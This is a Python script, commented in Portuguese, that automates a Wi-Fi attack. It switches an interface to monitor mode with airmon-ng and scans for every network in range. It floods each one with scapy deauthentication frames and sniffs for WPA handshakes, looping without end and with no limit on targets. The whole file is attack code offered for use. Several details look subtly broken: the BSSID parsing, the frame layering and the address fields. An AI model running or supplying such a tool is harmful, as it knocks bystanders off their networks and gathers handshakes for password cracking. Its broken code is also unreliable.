import os
import time
from scapy.all import *

# Defina a interface de rede
interface = "wlan0"  # Substitua pela sua interface de rede

# Armazena redes já processadas
captured_networks = set()

def get_networks():
    """Captura redes Wi-Fi disponíveis."""
    networks = []
    # Executa o comando para escanear redes
    results = os.popen(f"sudo iwlist {interface} scan").read()
    for line in results.splitlines():
        if "Cell" in line:
            bssid = line.split()[5]
            if bssid not in captured_networks:
                networks.append(bssid)
    return networks

def deauth_attack(target_bssid):
    """Envia pacotes de desautenticação para a rede alvo."""
    print(f"Atacando {target_bssid} com pacotes de deauth...")
    # Envia pacotes de desautenticação
    sendp(Ether(dst=target_bssid)/Dot11(addr1=target_bssid, addr2=target_bssid, addr3=target_bssid)/Dot11Deauth(), iface=interface, count=100)

def capture_handshake(target_bssid):
    """Captura o handshake da rede alvo."""
    print(f"Capturando handshake para {target_bssid}...")
    sniff(iface=interface, prn=lambda x: x.summary(), filter=f"ether host {target_bssid}", count=10)  # Ajuste o count conforme necessário

def main():
    """Função principal que executa o ataque."""
    os.system(f"sudo airmon-ng start {interface}")  # Coloca a interface em modo monitor

    while True:
        networks = get_networks()
        for network in networks:
            if network not in captured_networks:
                captured_networks.add(network)
                deauth_attack(network)
                capture_handshake(network)
        time.sleep(5)  # Aguarda um tempo antes de escanear novamente

if __name__ == "__main__":
    main()